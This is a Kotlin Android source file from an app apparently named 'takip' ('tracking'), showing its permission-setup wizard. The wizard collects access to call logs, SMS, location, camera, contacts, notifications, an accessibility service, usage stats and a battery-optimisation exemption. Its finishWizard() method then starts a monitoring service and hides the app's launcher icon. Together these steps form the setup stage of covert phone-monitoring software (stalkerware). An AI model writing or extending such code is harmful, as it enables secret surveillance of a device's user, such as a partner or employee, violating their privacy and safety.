package com.takip.app.ui

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.takip.app.R
import com.takip.app.databinding.ActivityPermissionWizardBinding
import com.takip.app.databinding.ItemPermissionStepBinding
import com.takip.app.service.MonitoringService
import com.takip.app.service.TakipAccessibilityService
import com.takip.app.util.AppHider
import com.takip.app.util.PermissionChecker

class PermissionWizardActivity : AppCompatActivity() {

    private lateinit var binding: ActivityPermissionWizardBinding
    private var permissionDialogShown = false

    private val runtimePermissions = mutableListOf(
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_SMS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.READ_CONTACTS,
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityPermissionWizardBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.stepRuntime.root.setOnClickListener { openRuntimePermissions() }
        binding.stepNotification.root.setOnClickListener { openNotificationSettings() }
        binding.stepAccessibility.root.setOnClickListener { openAccessibilitySettings() }
        binding.stepBattery.root.setOnClickListener { openBatterySettings() }
        binding.stepUsage.root.setOnClickListener { openUsageSettings() }

        binding.manualButton.setOnClickListener { openFirstMissingStep() }
        binding.finishButton.setOnClickListener { finishWizard() }

        updateSteps()
        binding.statusText.text = getString(R.string.wizard_tap_hint)
    }

    override fun onResume() {
        super.onResume()
        updateSteps()
        if (allGranted()) {
            binding.finishButton.visibility = View.VISIBLE
            binding.statusText.text = getString(R.string.wizard_all_done)
        }
    }

    private fun openFirstMissingStep() {
        updateSteps()
        when {
            !runtimeGranted() -> openRuntimePermissions()
            !notificationGranted() -> openNotificationSettings()
            !accessibilityGranted() -> openAccessibilitySettings()
            !batteryGranted() -> openBatterySettings()
            !usageGranted() -> openUsageSettings()
            else -> finishWizard()
        }
    }

    private fun openRuntimePermissions() {
        binding.statusText.text = getString(R.string.wizard_runtime)
        val missing = missingRuntimePermissions()
        if (missing.isEmpty()) {
            updateSteps()
            return
        }

        if (!permissionDialogShown) {
            permissionDialogShown = true
            ActivityCompat.requestPermissions(this, missing, REQ_RUNTIME)
            return
        }

        openAppSettings()
    }

    private fun openAppSettings() {
        binding.statusText.text = getString(R.string.wizard_app_settings)
        try {
            startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:$packageName")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            })
        } catch (_: Exception) {
            startActivity(Intent(Settings.ACTION_SETTINGS))
        }
    }

    private fun openNotificationSettings() {
        binding.statusText.text = getString(R.string.wizard_notification)
        try {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            })
        } catch (_: Exception) {
            openAppSettings()
        }
    }

    private fun openAccessibilitySettings() {
        binding.statusText.text = getString(R.string.wizard_accessibility)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                startActivity(Intent(ACTION_ACCESSIBILITY_DETAILS).apply {
                    putExtra(
                        Intent.EXTRA_COMPONENT_NAME,
                        ComponentName(this@PermissionWizardActivity, TakipAccessibilityService::class.java)
                    )
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
                return
            } catch (_: Exception) {
            }
        }
        try {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            })
        } catch (_: Exception) {
            openAppSettings()
        }
    }

    private fun openBatterySettings() {
        binding.statusText.text = getString(R.string.wizard_battery)
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (pm.isIgnoringBatteryOptimizations(packageName)) {
            updateSteps()
            return
        }
        try {
            startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            })
        } catch (_: Exception) {
            try {
                startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                })
            } catch (_: Exception) {
                openAppSettings()
            }
        }
    }

    private fun openUsageSettings() {
        binding.statusText.text = getString(R.string.wizard_usage)
        if (usageGranted()) {
            updateSteps()
            return
        }
        try {
            startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            })
        } catch (_: Exception) {
            openAppSettings()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        updateSteps()
        if (requestCode == REQ_RUNTIME && !runtimeGranted()) {
            binding.statusText.text = getString(R.string.wizard_runtime_denied)
        }
    }

    private fun finishWizard() {
        MonitoringService.start(this)
        AppHider.hideLauncherIcon(this)
        finish()
    }

    private fun missingRuntimePermissions(): Array<String> {
        return runtimePermissions
            .filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
            .toTypedArray()
    }

    private fun runtimeGranted(): Boolean = missingRuntimePermissions().isEmpty()

    private fun notificationGranted(): Boolean =
        PermissionChecker.getStatus(this).optBoolean("notifications")

    private fun accessibilityGranted(): Boolean =
        PermissionChecker.getStatus(this).optBoolean("accessibility")

    private fun batteryGranted(): Boolean =
        PermissionChecker.getStatus(this).optBoolean("batteryOptimization")

    private fun usageGranted(): Boolean =
        PermissionChecker.getStatus(this).optBoolean("usageStats")

    private fun allGranted(): Boolean =
        runtimeGranted() && notificationGranted() && accessibilityGranted() &&
            batteryGranted() && usageGranted()

    private fun updateSteps() {
        val done = listOf(
            runtimeGranted(),
            notificationGranted(),
            accessibilityGranted(),
            batteryGranted(),
            usageGranted()
        ).count { it }

        binding.progressText.text = getString(R.string.wizard_progress, done, 5)
        styleStep(binding.stepRuntime, runtimeGranted(), getString(R.string.wizard_step_runtime))
        styleStep(binding.stepNotification, notificationGranted(), getString(R.string.wizard_step_notification))
        styleStep(binding.stepAccessibility, accessibilityGranted(), getString(R.string.wizard_step_accessibility))
        styleStep(binding.stepBattery, batteryGranted(), getString(R.string.wizard_step_battery))
        styleStep(binding.stepUsage, usageGranted(), getString(R.string.wizard_step_usage))

        if (allGranted()) {
            binding.finishButton.visibility = View.VISIBLE
        }
    }

    private fun styleStep(step: ItemPermissionStepBinding, ok: Boolean, label: String) {
        step.stepTitle.text = label
        if (ok) {
            step.root.setBackgroundResource(R.drawable.bg_step_done)
            step.stepStatus.text = "✓"
            step.stepStatus.setTextColor(ContextCompat.getColor(this, R.color.step_done_text))
            step.stepHint.visibility = View.GONE
            step.root.isClickable = false
        } else {
            step.root.setBackgroundResource(R.drawable.bg_step_pending)
            step.stepStatus.text = "›"
            step.stepStatus.setTextColor(ContextCompat.getColor(this, R.color.step_pending_text))
            step.stepHint.visibility = View.VISIBLE
            step.root.isClickable = true
        }
    }

    companion object {
        private const val REQ_RUNTIME = 100
        private const val ACTION_ACCESSIBILITY_DETAILS = "android.settings.ACCESSIBILITY_DETAILS_SETTINGS"
    }
}
